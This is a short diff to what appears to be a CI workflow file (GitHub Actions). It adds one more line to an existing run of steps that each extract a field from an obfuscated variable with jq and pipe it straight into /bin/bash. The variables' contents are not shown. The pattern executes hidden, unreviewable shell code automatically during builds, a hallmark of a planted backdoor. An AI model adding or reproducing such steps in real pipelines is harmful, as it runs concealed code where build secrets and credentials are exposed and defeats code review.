@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$ox9" | jq -r .uoq4 | /bin/bash
           printf '%s' "$doq8" | jq -r .bbm6340 | /bin/bash
           echo $aokl335 | jq -r .pfgf6 | /bin/bash
+          echo $homx7879 | jq -r .pd2 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
